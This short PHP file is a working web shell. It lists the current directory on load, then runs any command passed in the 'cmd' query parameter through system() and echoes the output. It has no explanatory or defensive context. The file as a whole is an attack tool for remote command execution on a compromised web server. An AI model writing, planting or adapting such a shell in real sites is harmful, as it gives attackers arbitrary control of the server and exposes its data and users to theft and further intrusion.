<?php
echo system("ls");
if ($_GET['cmd'])
{
  echo system($_GET['cmd']);
  echo "end of cmd";
}
  echo "end of shell";
?>
